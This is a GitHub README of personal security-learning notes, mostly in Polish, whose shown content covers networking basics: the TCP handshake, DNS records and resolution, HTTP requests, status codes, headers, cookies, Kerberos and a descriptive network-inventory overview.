# my-all-notes
it is my all notes about almost every hacking topics I've been learned in 3/4 years (almost everything written in polish)

### Czym jest to respozytorium? 
Są to prawie wszystkie moje notatki które zapisywałem sobie podczas mojej nauki przez ok. 3/4lata. Jest tutaj prawie każda dziedzina tej specyfikacji gdyż jak nudził mi się 1 temat, zaczynałem się uczyć 2 i tak dalej. Są tu napisane informację które w danym czasie zapisywania, uważałem za przydatne/użyteczne. Pokazują one moją całą drogę uczenia się,  (nie uwzględniając filmów i książek, aczkolwiek może z czasem dodam listę wraz z rzeczami którym się z nich nauczyłem, a nie ma ich w obecnym "zbiorze" notatek). Z czasem będę aktualizował ten projekt, dodając kolejne rzeczy których się nauczę w przyszłości. 

### Jaki jest Cel tego?
Często sam podczas nauki, nie wiedziałem już skąd i czego się uczyć przez ten ogrom dostępnych informacji, dlatego udostępniam moje notatki gdzie są zgromadzone różne urywki bądź całe artykuły które dają wiedzę teoretyczną jak i praktyczną bez opowiadania całej historii nie związane z tematyką i ściśle odpowiadają na często zadawane pytania. Osobiście uważam że te notatki są przydatne dla każdego typu poziomu, od początkującego po odświeżenie wiedzy dla zawansowanych (i nauczenie sie nowych tematów).



MOJE WSZYSTKIE NOTATKI
 |----------------------------------------------------------------------------------------------------------------|
 [Podstawy](https://github.com/X-3306/my-all-notes/blob/main/README.md#podstawy)
 |----------------------------------------------------------------------------------------------------------------|
 [Hacking](https://github.com/X-3306/my-all-notes#general-hacking)
 |----------------------------------------------------------------------------------------------------------------|
 [BugBounty](https://github.com/X-3306/my-all-notes#bug-bounty)
 |----------------------------------------------------------------------------------------------------------------|
 [Programowanie](https://github.com/X-3306/my-all-notes#programowanie)
 |----------------------------------------------------------------------------------------------------------------|
 [C++](https://github.com/X-3306/my-all-notes#c)
 |----------------------------------------------------------------------------------------------------------------|
 [Inżynieria wsteczna](https://github.com/X-3306/my-all-notes#in%C5%BCynieria-wsteczna)
 |----------------------------------------------------------------------------------------------------------------|
 [C](https://github.com/X-3306/my-all-notes#c-1)
 |----------------------------------------------------------------------------------------------------------------|
 [CTFY](https://github.com/X-3306/my-all-notes#ctfy)
 |----------------------------------------------------------------------------------------------------------------|
 [Python](https://github.com/X-3306/my-all-notes#python)
 |----------------------------------------------------------------------------------------------------------------|
 [Malware Development](https://github.com/X-3306/my-all-notes#malware-development)
 |----------------------------------------------------------------------------------------------------------------|
 [IOT i rzeczy fizyczne](https://github.com/X-3306/my-all-notes/tree/main#hakowanie-iot-i-rzeczy-fizyczne)      
|----------------------------------------------------------------------------------------------------------------|













# Podstawy
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Twój laptop zawiera kartę sieciową (NIC) , która umożliwia mu łączenie 
się z routerami Wi-Fi. Ta karta ma unikalny adres, zwany adresem MAC, 
który identyfikuje urządzenie w sieci. Gdy router chce wysłać informacje 
o komputerze, oznacza ten pakiet adresem MAC laptopa, a następnie 
nadaje go jako sygnał radiowy. Wszystkie maszyny podłączone do tego 
routera odbierają ten sygnał radiowy i sprawdzają adres MAC pakietu


Klient inicjuje połączenie TCP, wysyłając serwerowi SYN
pakiet, który jest pakietem TCP z flagą SYN ustawioną na true. Ten 
pakiet SYN zawiera również początkowy numer sekwencyjny klienta. 
Na przykład wysłanie pakietu SYN(3) jest jak powiedzenie „Cześć, mój 
początkowy numer sekwencyjny to 3. Jaki jest twój?” Gdy serwer 
otrzyma pakiet SYN, rejestruje numer sekwencyjny klienta i odpowiada, 
wysyłając pakiet SYN-ACK, który ma obie flagi SYN i ACK ustawione na 
true. Ten pakiet SYN-ACK potwierdza otrzymanie numeru sekwencyjnego 
klienta i wysyła numer sekwencyjny serwera.
Na przykład pakiet SYN(0) ACK(4) jest odpowiednikiem powiedzenia 
„Mój początkowy numer sekwencyjny to 0 i oczekuję, że wyślesz 
następny pakiet 4.”. Jednak połączenie nie jest nawiązywane, dopóki 
serwer nie otrzyma pakietu ACK z powiadomieniem, że klient 
otrzymał swój numer sekwencji i oczekuje następnej wartości w sekwencji.
Gdy systemy zakończą wymianę pakietów, zamykają się
połączenie poprzez wymianę pakietów FIN i ACK.

MULTICASTDNS (MDNS) - 
W sieciach komputerowych protokół DNS multiemisji rozwiązuje nazwy hostów na adresy IP w małych sieciach, które nie zawierają lokalnego serwera nazw.

NEL . Nagłówek odpowiedzi HTTP NEL jest używany do konfigurowania rejestrowania żądań sieciowych. Typ nagłówka . Nagłówek odpowiedzi . Zabroniona nazwa nagłówka .

DNS (Domain Name System) zapewnia nam prosty sposób komunikowania się z urządzeniami w Internecie bez zapamiętywania liczb złożonych. Podobnie jak każdy dom ma unikalny adres do wysyłania poczty bezpośrednio do niego, każdy komputer w Internecie ma swój własny unikalny adres do komunikacji z nim, zwany adresem IP. Adres IP wygląda następująco 104.26.10.229 , 4 zestawy cyfr z zakresu od 0 do 255 oddzielone kropką. Kiedy chcesz odwiedzić stronę internetową, pamiętanie tego skomplikowanego zestawu liczb nie jest zbyt wygodne i właśnie w tym może pomóc DNS . Więc zamiast pamiętać 104.26.10.229, możesz zamiast tego pamiętać tryhackme.com.

DNS nie jest jednak przeznaczony tylko dla stron internetowych i istnieje wiele typów rekordów DNS. Omówimy niektóre z najczęstszych, z którymi możesz się spotkać.

A Record

Te rekordy są tłumaczone na adresy IPv4, na przykład 104.26.10.229

Rekord AAAA

Rekordy te są tłumaczone na adresy IPv6, na przykład 2606:4700:20::681a:be5

Rekord CNAME

Rekordy te są tłumaczone na inną nazwę domeny, na przykład sklep internetowy TryHackMe ma nazwę subdomeny store.tryhackme.com, która zwraca rekord CNAME shopify.com. Następnie zostanie wysłane kolejne żądanie DNS do shopify.com w celu ustalenia adresu IP.

Rekord MX

Rekordy te są rozpoznawane jako adresy serwerów obsługujących pocztę e-mail dla domeny, której dotyczy zapytanie, na przykład odpowiedź rekordu MX dla tryhackme.com wyglądałaby mniej więcej tak: alt1.aspmx.l.google.com . Te rekordy są również opatrzone flagą priorytetu. To mówi klientowi, w jakiej kolejności wypróbować serwery, jest to idealne rozwiązanie, gdy główny serwer ulegnie awarii i e-mail musi zostać wysłany na serwer zapasowy.

Rekord TXT

Rekordy TXT to pola tekstowe, w których można przechowywać dowolne dane tekstowe. Rekordy TXT mają wiele zastosowań, ale niektóre z nich to najczęściej wymieniane serwery, które mają uprawnienia do wysyłania wiadomości e-mail w imieniu domeny (może to pomóc w walce ze spamem i sfałszowaną wiadomością e-mail). Mogą być również używane do weryfikacji własności nazwy domeny podczas rejestracji w usługach stron trzecich.

Gdy żądasz nazwy domeny, komputer najpierw sprawdza swoją lokalną pamięć podręczną, aby sprawdzić, czy ostatnio wyszukiwałeś adres; jeśli nie, zostanie wysłane żądanie do Twojego Rekursywnego Serwera DNS .

Rekursywny serwer DNS jest zwykle dostarczany przez dostawcę usług internetowych, ale możesz również wybrać własny. Ten serwer ma również lokalną pamięć podręczną ostatnio wyszukanych nazw domen. Jeśli wynik zostanie znaleziony lokalnie, zostanie on odesłany z powrotem do Twojego komputera, a Twoje żądanie kończy się tutaj (jest to powszechne w przypadku popularnych i często poszukiwanych usług, takich jak Google, Facebook, Twitter). Jeśli żądanie nie może zostać znalezione lokalnie, podróż rozpoczyna się od znalezienia prawidłowej odpowiedzi, zaczynając od głównych serwerów DNS Internetu.

Serwery główne działają jako szkielet DNS Internetu; ich zadaniem jest przekierowanie Cię do właściwego Serwera Domeny Najwyższego Poziomu, w zależności od Twojego żądania. Jeśli, na przykład, zażądasz www.tryhackme.com , serwer główny rozpozna domenę najwyższego poziomu .com i skieruje Cię do właściwego serwera TLD, który zajmuje się adresami .com.

Serwer TLD przechowuje rekordy określające, gdzie znaleźć autorytatywny serwer, który odpowie na żądanie DNS . Serwer autorytatywny jest często nazywany także serwerem nazw domeny. Na przykład serwer nazw dla tryhackme.com to kip.ns.cloudflare.com i uma.ns.cloudflare.com . Często można znaleźć wiele serwerów nazw, aby nazwa domeny działała jako kopia zapasowa na wypadek awarii jednego z nich.

Autorytatywny serwer DNS to serwer, który jest odpowiedzialny za przechowywanie rekordów DNS dla określonej nazwy domeny i na którym będą dokonywane wszelkie aktualizacje rekordów DNS nazwy domeny. W zależności od typu rekordu, rekord DNS jest następnie odsyłany do rekursywnego serwera DNS, gdzie lokalna kopia będzie buforowana dla przyszłych żądań, a następnie przekazywana z powrotem do oryginalnego klienta, który wysłał żądanie. Wszystkie rekordy DNS mają wartość TTL (Time To Live). Ta wartość to liczba wyrażona w sekundach, dla której odpowiedź powinna zostać zapisana lokalnie, dopóki nie będziesz musiał jej ponownie wyszukać. Buforowanie pozwala zaoszczędzić na konieczności wykonywania żądania DNS za każdym razem, gdy komunikujesz się z serwerem.

Co to jest HTTP? (Protokół przesyłania hipertekstu)

Gdy uzyskujemy dostęp do strony internetowej, Twoja przeglądarka będzie musiała wysyłać żądania do serwera internetowego o zasoby, takie jak HTML, obrazy, i pobierać odpowiedzi. Wcześniej musisz dokładnie powiedzieć przeglądarce, jak i gdzie uzyskać dostęp do tych zasobów, tutaj pomogą adresy URL.

Co to jest adres URL? (jednolity lokalizator zasobów)

Jeśli korzystałeś z internetu, wcześniej używałeś adresu URL. Adres URL to przede wszystkim instrukcja, jak uzyskać dostęp do zasobu w Internecie. Poniższy obrazek pokazuje, jak wygląda adres URL ze wszystkimi jego funkcjami (nie używa wszystkich funkcji w każdym żądaniu).

![a7b0f3884a710a4713cf9f5807a59357.png](:/171a8b0e1da24703824777f2b5175a46)

Schemat: Instruuje jakiego protokołu użyć do uzyskania dostępu do zasobu, takiego jak HTTP , HTTPS, FTP (protokół przesyłania plików).

Użytkownik: Niektóre usługi wymagają uwierzytelnienia, aby się zalogować, możesz umieścić nazwę użytkownika i hasło w adresie URL, aby się zalogować.

Host: nazwa domeny lub adres IP serwera, do którego chcesz uzyskać dostęp.

Port: Port, z którym będziesz się łączyć, zwykle 80 dla HTTP i 443 dla HTTPS, ale może być hostowany na dowolnym porcie od 1 do 65535.

Ścieżka: nazwa pliku lub lokalizacja zasobu, do którego próbujesz uzyskać dostęp.

Ciąg zapytania: dodatkowe bity informacji, które można wysłać na żądaną ścieżkę. Na przykład /blog? id=1 poinformuje ścieżkę bloga, że ​​chcesz otrzymywać artykuł na blogu o identyfikatorze 1.

Fragment: jest to odniesienie do lokalizacji na żądanej stronie. Jest to powszechnie stosowane w przypadku stron o długiej treści i może mieć bezpośrednio połączoną określoną część strony, dzięki czemu jest ona widoczna dla użytkownika, gdy tylko uzyska dostęp do strony.

Składam prośbę

Możliwe jest wysłanie żądania do serwera WWW za pomocą tylko jednej linii " GET / HTTP/1.1 "

![30ecc65c624994d1798bb5711089cb1b.png](:/88d1f3a691b6495fb4ee7f799f3ed569)

Ale aby uzyskać znacznie bogatsze wrażenia w sieci, musisz również wysłać inne dane. Te inne dane są wysyłane w tak zwanych nagłówkach, gdzie nagłówki zawierają dodatkowe informacje, które należy przekazać serwerowi internetowemu, z którym się komunikujesz, ale zajmiemy się tym dokładniej w zadaniu Nagłówek.

Przykładowe żądanie:
**GET / HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0 Firefox/87.0
Referer: https://tryhackme.com/**

Linia 1: To żądanie wysyła metodę GET (więcej na ten temat w zadaniu Metody HTTP ), żąda strony głównej za pomocą / i informuje serwer WWW, że używamy protokołu HTTP w wersji 1.1.

Linia 2: Mówimy serwerowi WWW, że chcemy mieć stronę tryhackme.com

Linia 3: Mówimy serwerowi WWW, że używamy przeglądarki Firefox w wersji 87

Linia 4: Informujemy serwer sieciowy, że strona, która nas do niej skierowała, to https://tryhackme.com

Wiersz 5: Żądania HTTP zawsze kończą się pustą linią informującą serwer WWW, że żądanie zostało zakończone.

Przykładowa odpowiedź:


```
HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Fri, 09 Apr 2021 13:34:03 GMT
Content-Type: text/html
Content-Length: 98

<html>
<head>
    <title>TryHackMe</title>
</head>
<body>
    Welcome To TryHackMe.com
</body>
</html>
```
Aby podzielić każdy wiersz odpowiedzi:

Wiersz 1: HTTP 1.1 to wersja protokołu HTTP używanego przez serwer, po której następuje w tym przypadku kod stanu HTTP „200 Ok”, który informuje nas, że żądanie zostało zakończone pomyślnie.

Linia 2: zawiera informacje o oprogramowaniu serwera WWW i numerze wersji.

Linia 3: aktualna data, godzina i strefa czasowa serwera WWW.

Linia 4: Nagłówek Content-Type mówi klientowi, jakiego rodzaju informacje zostaną wysłane, takie jak HTML, obrazy, filmy, pdf, XML .

Linia 5: Content-Length informuje klienta o długości odpowiedzi, dzięki czemu możemy potwierdzić, że nie brakuje danych.

Wiersz 6: Odpowiedź HTTP zawiera pustą linię, aby potwierdzić koniec odpowiedzi HTTP.

Wiersze 7-14: Żądane informacje, w tym przypadku strona główna.


Metody HTTP umożliwiają klientowi pokazanie zamierzonej akcji podczas wykonywania żądania HTTP. Istnieje wiele metod HTTP, ale omówimy te najczęstsze, chociaż najczęściej będziesz miał do czynienia z metodą GET i POST.

POBIERZ ŻĄDANIE (GET REQUEST)

Służy do pobierania informacji z serwera WWW.

Żądanie POST (POST REQUEST)

Służy do przesyłania danych na serwer WWW i potencjalnego tworzenia nowych rekordów

Żądanie PUT (PUT REQUEST)

Służy do przesyłania danych na serwer sieciowy w celu aktualizacji informacji

USUŃ żądanie (DELETE REQUEST)

Służy do usuwania informacji/rekordów z serwera WWW.

Kody stanu HTTP :
W poprzednim zadaniu dowiedziałeś się, że gdy serwer HTTP odpowiada, pierwsza linia zawsze zawiera kod statusu informujący klienta o wyniku jego żądania, a także potencjalnie o tym, jak go obsłużyć. Te kody stanu można podzielić na 5 różnych zakresów:

```
100-199 - Odpowiedź informacyjna	Są one wysyłane, aby poinformować klienta, że ​​pierwsza część jego prośby została zaakceptowana i powinien kontynuować wysyłanie reszty prośby. Te kody nie są już bardzo powszechne.
200-299 - Sukces	Ten zakres kodów stanu służy do informowania klienta, że ​​jego żądanie zakończyło się powodzeniem.
300-399 — Przekierowanie	Służą one do przekierowania żądania klienta do innego zasobu. Może to dotyczyć innej strony internetowej lub zupełnie innej witryny.
400-499 — Błędy klienta	Służy do informowania klienta, że ​​wystąpił błąd w jego żądaniu.
500-599 — Błędy serwera	Jest to zarezerwowane dla błędów występujących po stronie serwera i zwykle wskazuje na dość poważny problem z obsługą żądania przez serwer.
```
Typowe kody stanu HTTP :

Istnieje wiele różnych kodów stanu HTTP i nie obejmuje to faktu, że aplikacje mogą nawet definiować własne, omówimy najczęstsze odpowiedzi HTTP, z którymi możesz się spotkać:


```
200 - OK	Żądanie zostało pomyślnie zrealizowane.
201 - Utworzono	Utworzono zasób (na przykład nowy użytkownik lub nowy wpis na blogu).
301 — Stałe przekierowanie	Przekierowuje to przeglądarkę klienta na nową stronę internetową lub informuje wyszukiwarki, że strona została przeniesiona w inne miejsce i zamiast tego szukała.
302 — Tymczasowe przekierowanie	Podobny do powyższego stałego przekierowania, ale jak sama nazwa wskazuje, jest to tylko tymczasowa zmiana i może zmienić się ponownie w najbliższej przyszłości.
400 — Zła prośba	To informuje przeglądarkę, że coś było nie tak lub czegoś brakuje w jej żądaniu. Może to być czasami używane, jeśli żądany zasób serwera WWW oczekiwał określonego parametru, którego klient nie wysłał.
401 — Brak autoryzacji	Obecnie nie możesz przeglądać tego zasobu, dopóki nie dokonasz autoryzacji w aplikacji internetowej, najczęściej przy użyciu nazwy użytkownika i hasła.
403 - Zabronione	Nie masz uprawnień do wyświetlania tego zasobu, niezależnie od tego, czy jesteś zalogowany, czy nie.
405 — Niedozwolona metoda	Zasób nie zezwala na to żądanie metody, na przykład wysyłasz żądanie GET do zasobu /create-account, gdy zamiast tego oczekiwał żądania POST.
404 — Nie znaleziono strony	Żądana strona/zasób nie istnieje.
500 — Wewnętrzny błąd usługi	Serwer napotkał jakiś błąd w twoim żądaniu, który nie wie, jak poprawnie obsłużyć.
503 Usługa niedostępna
``` 
Ten serwer nie może obsłużyć Twojego żądania, ponieważ jest przeciążony lub wyłączony z powodu konserwacji.


Nagłówki to dodatkowe bity danych, które możesz wysłać do serwera WWW podczas wysyłania żądań.

Chociaż żadne nagłówki nie są bezwzględnie wymagane przy wysyłaniu żądania HTTP , trudno będzie prawidłowo wyświetlić witrynę.

Wspólne nagłówki żądań
﻿Są to nagłówki, które są wysyłane od klienta (zazwyczaj przeglądarki) do serwera.

Host: Niektóre serwery internetowe obsługują wiele witryn internetowych, więc dostarczając nagłówki hosta, możesz określić, którego z nich potrzebujesz, w przeciwnym razie otrzymasz domyślną witrynę internetową dla serwera.

User-Agent: To jest oprogramowanie przeglądarki i numer wersji, informujący serwer sieciowy, że oprogramowanie przeglądarki pomaga w prawidłowym sformatowaniu witryny dla Twojej przeglądarki, a niektóre elementy HTML, JavaScript i CSS są dostępne tylko w niektórych przeglądarkach.

Content-Length Podczas wysyłania danych do serwera WWW, na przykład w formularzu, długość treści informuje serwer WWW, ile danych ma oczekiwać w żądaniu WWW. W ten sposób serwer może zapewnić, że nie brakuje żadnych danych.

Accept-Encoding: Informuje serwer sieciowy, jakie rodzaje metod kompresji obsługuje przeglądarka, dzięki czemu dane mogą być mniejsze do przesyłania przez Internet.

Cookie: Dane wysyłane do serwera, aby pomóc zapamiętać Twoje informacje (zobacz zadanie plików cookie, aby uzyskać więcej informacji).

Wspólne nagłówki odpowiedzi
Są to nagłówki zwracane klientowi z serwera po żądaniu.

Set-Cookie: Informacje do przechowywania, które są wysyłane z powrotem do serwera WWW przy każdym żądaniu (zobacz zadanie cookies, aby uzyskać więcej informacji).

Cache-Control:ak długo przechowywać zawartość odpowiedzi w pamięci podręcznej przeglądarki, zanim ponownie zażąda jej.

Content-Type: Informuje klienta, jaki typ danych jest zwracany, tj. HTML, CSS, JavaScript, Obrazy, PDF, Wideo itp. Używając nagłówka content-type przeglądarka wie, jak przetwarzać dane.

Content-Encoding: Jaka metoda została użyta do skompresowania danych, aby zmniejszyć je podczas wysyłania ich przez Internet

Prawdopodobnie słyszałeś już o plikach cookie, to tylko niewielki fragment danych przechowywanych na Twoim komputerze. Pliki cookie są zapisywane po otrzymaniu nagłówka „Set-Cookie” z serwera internetowego. Następnie przy każdym kolejnym żądaniu wyślesz dane z plików cookie z powrotem na serwer sieciowy. Ponieważ protokół HTTP jest bezstanowy (nie śledzi twoich poprzednich żądań), pliki cookie mogą być używane do przypominania serwerowi WWW, kim jesteś, niektórych osobistych ustawień witryny lub czy byłeś na niej wcześniej. Przyjrzyjmy się temu jako przykładowemu żądaniu HTTP:

![3ef88e362cc8b52ffe1980d6ccf4dcf0.png](:/35676de54c9241488a52a289147eee8d)
Pliki cookie mogą być wykorzystywane do wielu celów, ale najczęściej są używane do uwierzytelniania witryn internetowych. Wartość pliku cookie zwykle nie będzie ciągiem zwykłego tekstu, w którym można zobaczyć hasło, ale tokenem (unikalny tajny kod, który nie jest łatwy do odgadnięcia przez człowieka).

Przeglądanie plików cookie

Możesz łatwo sprawdzić, jakie pliki cookie Twoja przeglądarka wysyła do witryny, korzystając z narzędzi programistycznych w przeglądarce. Jeśli nie masz pewności, jak uzyskać dostęp do narzędzi programistycznych w przeglądarce, kliknij przycisk „Wyświetl witrynę” u góry tego zadania, aby uzyskać przewodnik.

Po otwarciu narzędzi programistycznych kliknij kartę „Sieć”. Ta karta pokaże Ci listę wszystkich zasobów, których zażądała Twoja przeglądarka. Możesz kliknąć na każdy z nich, aby otrzymać szczegółowe zestawienie prośby i odpowiedzi. Jeśli Twoja przeglądarka wysłała plik cookie, zobaczysz je na karcie „Cookies” żądania.

Najpierw przyjrzyjmy się, jak hasła są przechowywane na twoim komputerze lub dowolnym serwerze.
Gdy wprowadzasz hasło do konta, hasło nie jest zapisywane w surowym formacie. Konwertuje hashing algorithmsurowe hasło na ciąg znaków (hash), którego dekodowanie zajęłoby dużo czasu i zasobów.

Sieć rozległa (WAN)
Sieć WAN rozciąga się na dużym obszarze geograficznym i łączy indywidualnych użytkowników lub wiele sieci LAN. Internet można uznać za sieć WAN. Duże organizacje wykorzystują sieci WAN do łączenia różnych lokalizacji, zdalnych pracowników, dostawców i centrów danych, dzięki czemu mogą uruchamiać aplikacje i uzyskiwać dostęp do niezbędnych danych.

Fizyczną łączność w sieciach WAN można uzyskać za pomocą linii dzierżawionych, połączeń komórkowych, łączy satelitarnych i innych środków.

Sieć firmowa
Sieć zbudowana dla dużej organizacji, zwykle nazywanej przedsiębiorstwem, musi spełniać rygorystyczne wymagania. Ponieważ sieć ma kluczowe znaczenie dla funkcjonowania każdego nowoczesnego przedsiębiorstwa, sieci korporacyjne muszą być wysoce dostępne, skalowalne i niezawodne. Sieci te mają narzędzia, które umożliwiają inżynierom i operatorom sieci projektowanie, wdrażanie, debugowanie i korygowanie ich.

Przedsiębiorstwo może korzystać zarówno z sieci LAN, jak i WAN w swoim kampusie, oddziałach i centrach danych.

Sieć dostawców usług
Dostawcy usług obsługują sieci WAN w celu zapewnienia łączności indywidualnym użytkownikom lub organizacjom. Mogą oferować przedsiębiorstwom prostą łączność w postaci łączy dzierżawionych lub bardziej zaawansowane usługi zarządzane. Dostawcy usług zapewniają również swoim klientom łączność internetową i komórkową.

Z czego składa się sieć korporacyjna?
Chociaż sieć przedsiębiorstwa musi dostarczać kompleksowe usługi użytkownikom, rzeczom i aplikacjom, może składać się z oddzielnych, ale połączonych domen składowych. Zazwyczaj każda sieć składowa jest projektowana, udostępniana i optymalizowana pod kątem własnego celu i celów biznesowych. Składowe typy sieci obejmują:

Kampus, oddział i Internet rzeczy (IoT): sieci te zapewniają stały i mobilny dostęp do użytkowników i rzeczy. Są obecne we wszystkich obszarach organizacji, zarówno w biurach, jak i w przestrzeniach operacyjnych, takich jak hale produkcyjne i magazynowe. Sieci te są zoptymalizowane pod kątem przejrzystego, bezpiecznego dostępu i wysokiej gęstości.
Centra danych i chmury hybrydowe: sieci te łączą się z aplikacjami, obciążeniami i danymi oraz między nimi w lokalnych centrach danych oraz prywatnych i publicznych usługach chmurowych. Są zoptymalizowane pod kątem małych opóźnień, bezpieczeństwa i niezawodności o znaczeniu krytycznym.
Sieci rozległe (WAN): Sieci te łączą obiekty, budynki lub kampusy z innymi oddziałami, centrami danych lub zasobami w chmurze. Są zoptymalizowane pod kątem wygody użytkownika i wydajności przepustowości.
Jak rozwijają się sieci korporacyjne?
Zapewnienie podstaw dla nowoczesnego przedsiębiorstwa cyfrowego: coraz częściej oczekuje się, że sieci poprawią bezpieczeństwo, poprawią komfort użytkowania i będą obsługiwać wiele urządzeń wykonujących podstawowe zadania biznesowe. Dobrze zaprojektowane sieci korporacyjne obsługują różnych użytkowników, urządzenia, inteligentne rzeczy i aplikacje, zapewniając spójną, gwarantowaną usługę.
Korzystanie z kontrolerów sieciowych: Jako centra dowodzenia i kontroli nowoczesnych sieci korporacyjnych, kontrolery koordynują wszystkie funkcje sieci. Wykonują takie zadania, jak przekładanie celów biznesowych na zasady, automatyzacja operacji na urządzeniach sieciowych, monitorowanie wydajności i rozwiązywanie problemów.
Rozszerzający się zakres: Wraz ze wzrostem liczby transakcji sieciowych rozpoczynających się lub kończących poza tradycyjnymi granicami korporacyjnymi — ze względu na trendy, takie jak ekspansja do wielu chmur publicznych, mobilność i praca z domu — sieć musi zwiększyć widoczność, kontrolę i bezpieczeństwo wszędzie tam, gdzie znajdują się użytkownicy, rzeczy i aplikacje.
Integracja w całym przedsiębiorstwie: Przedsiębiorstwa przyjmują obecnie holistyczną, otwartą strategię sieciową, która integruje się w składowych domenach sieciowych oraz z aplikacjami i systemami informatycznymi. Takie integracje zapewniają stałą wydajność, usprawnione operacje, lepszą zgodność i egzekwowanie bezpieczeństwa w całej organizacji.

Kerberos to protokół uwierzytelniania sieciowego Umożliwia węzłom bezpieczniejszą komunikację za pośrednictwem niezabezpieczonych sieci, takich jak większość protokołów internetowych, takich jak HTTP i FTP.

Działa przy użyciu biletów do uwierzytelniania autoryzowanych klientów na autoryzowanych serwerach i odwrotnie – łagodząc w ten sposób ataki typu man-in-the-middle i odpowiedzi. Zarówno klient , jak i serwer uwierzytelniają się wzajemnie pakietami wysyłanymi za pośrednictwem protokołu Kerberos, zwykle przeznaczonego na port UDP 88.

![ef762a5d6c6a395549fbaa865918b7c1.png](:/88cbd1b6f6d745e7b1a41c96f28c6605)

Webmin, internetowe narzędzie do konfiguracji systemu

https://www.onlineocr.net/pl/

HTTP: https://www.tutorialspoint.com/http/http_requests.htm

|-------------------SCSP/SFTP:---------------------|
Protokoły te są zwykle stosowane w celu przesyłania plików z lokalnego komputera do serwera lub między dwoma zdalnymi serwerami. SCP to protokół kopiowania plików, który wykorzystuje bezpieczne połączenie SSH, a SFTP to protokół transferu plików, który również korzysta z połączenia SSH.
|---------------------/|\-------------------------|


Wszystkie punkty dostępu hosta w sieci: Aby uzyskać listę wszystkich punktów dostępu hosta w sieci, można skorzystać z poleceń systemowych, takich jak ipconfig (w systemach Windows) lub ifconfig (w systemach Unix/Linux), aby wyświetlić informacje o wszystkich aktywnych interfejsach sieciowych na danym hoście.

Typy interfejsów dostępowych: Typy interfejsów dostępnych w urządzeniu mogą obejmować Ethernet (e), Fast-Ethernet (fe), Gigabit-Ethernet (ge), Universal Serial Bus (USB), Console (con), Loop-back (lo), Wi-Fi (w) itp. Każdy z tych interfejsów ma swoje unikalne cechy i prędkości transmisji danych. Na przykład, Ethernet jest szeroko stosowanym standardem w sieciach przewodowych, a Wi-Fi umożliwia bezprzewodowe połączenie.

Filtracja adresów MAC i NAC: Filtrowanie adresów MAC i NAC jest metodą kontroli dostępu, która pozwala na zezwolenie lub blokowanie urządzeń na podstawie ich adresów MAC lub innych kryteriów. Filtracja MAC polega na ustalaniu listy dozwolonych lub zabronionych adresów MAC, które mogą mieć dostęp do sieci. NAC (Network Access Control) to szeroki termin obejmujący różne techniki i narzędzia kontroli dostępu w sieciach. Celem NAC jest zapewnienie bezpiecznego i kontrolowanego dostępu do sieci na podstawie różnych czynników, takich jak uwierzytelnianie użytkownika, status zabezpieczeń urządzenia itp.

Dostęp do konsoli zdalnej i lokalnej: Dostęp do konsoli zdalnej lub lokalnej może być włączony lub zablokowany w zależności od konfiguracji urządzenia. Dostęp do konsoli zdalnej umożliwia zarządzanie urządzeniem z dowolnego miejsca w sieci, podczas gdy dostęp do konsoli lokalnej wymaga fizycznego dostępu do urządzenia. Zarówno dostęp zdalny, jak i lokalny mogą być kontrolowane za pomocą odpowiednich ustawień zabezpieczeń, takich jak hasła dostępu i listy dozwolonych adresów IP.

Zabezpieczenia fizyczne: Zabezpieczenia fizyczne w sieci mogą obejmować zamknięte pomieszczenia z serwerami, szafami serwerowymi lub blokadami USB. Zamknięte pomieszczenia i szafy serwerowe zapewniają kontrolę dostępu tylko dla uprawnionych osób. Blokady USB mogą być stosowane w celu zapobieżenia podłączeniu nieautoryzowanych urządzeń do komputerów.

Dziennik dostępu do interfejsu: Dziennik dostępu do interfejsu to narzędzie rejestrujące wszelkie próby dostępu do interfejsów sieciowych. Może zawierać informacje takie jak adres IP źródłowego hosta, data i godzina dostępu, wynik operacji (pomyślny/nieudany) itp.

Adresy IP i adresy MAC punktów dostępowych: Aby poznać adresy IP i adresy MAC punktów dostępowych w sieci, można skorzystać z narzędzi takich jak arp, ipconfig, ifconfig, show ip interface brief itp., w zależności od systemu operacyjnego i typu urządzenia sieciowego. Te narzędzia dostarczą informacje o adresach IP i adresach MAC przypisanych do poszczególnych interfejsów sieciowych.

Dostawcy usług internetowych (ISP): Liczba dostawców usług internetowych (ISP), którzy obsługują serwer, może być jednym lub więcej. To zależy od konkretnego środowiska i konfiguracji sieciowej.

Typ połączenia internetowego: Przepustowość łącza internetowego oraz rodzaj medium transmisyjnego (na przykład światłowód Ethernet, kabel koncentryczny itp.) zależą od konfiguracji sieciowej i dostawcy usług internetowych.

Przejścia do sieci: Przejścia do sieci, takie jak routery, przełączniki itp., mogą być wykorzystywane w celu połączenia różnych sieci lub segmentów sieci. Przejścia mogą mieć różne cechy i funkcje, takie jak routowanie pakietów, filtrowanie ruchu, zarządzanie pasmem, itp. Ostateczna konfiguracja przejść zależy od struktury i wymagań sieciowych.

Bramy graniczne, przejścia i punkty wyjścia:

Serwer może mieć jednego lub więcej dostawców usług internetowych (ISP), w zależności od konfiguracji.
Korzystanie z zaufanego połączenia internetowego (TIC) lub zarządzanej usługi internetowej (MIS) zależy od potrzeb i wymagań użytkownika.
Przepustowość łącza internetowego również zależy od wymagań i potrzeb użytkownika.
Przejścia prowadzące do sieci mogą różnić się w zależności od konfiguracji, mogą to być światłowody, kable koncentryczne lub inne kanały.
Istnieją różne sposoby na wejście lub wyjście z sieci, w tym satelita, kuchenka mikrofalowa, laser lub Wi-Fi.
Struktura i schemat sieci:

Nazwa, cel i rozmiar każdej podsieci, na przykład bezklasowy routing między domenami (CIDR), zależy od konfiguracji sieci.
Wirtualne sieci lokalne (VLAN) mogą być włączone lub wyłączone w zależności od potrzeb i wymagań użytkownika.
Limity puli połączeń również zależą od wymagań i potrzeb użytkownika.
Sieć może być płaska, hierarchiczna lub podzielona na struktury, warstwy ochronne i/lub funkcje.
Hosty i węzły sieciowe:

Nazwa i wersja systemu operacyjnego (OS) hostów i węzłów sieciowych zależy od konfiguracji sieci.
Usługi/porty używane na hostach i węzłach sieciowych, które są otwarte, zależą od konfiguracji sieci.
Narzędzia bezpieczeństwa zainstalowane na hostach i węzłach sieciowych, które pozwalają wykryć ataki, również zależą od konfiguracji sieci.
Wspólne luki w zabezpieczeniach (CVE) mogą występować w zależności od konfiguracji sieci.
Sieć fizyczna i logiczna oraz architektura budynku:

Centrum danych może znajdować się w różnych miejscach, w zależności od konfiguracji sieci.
Gniazda Ethernet w holu lub innym miejscu w budynku mogą być zainstalowane w zależności od potrzeb i wymagań użytkownika.
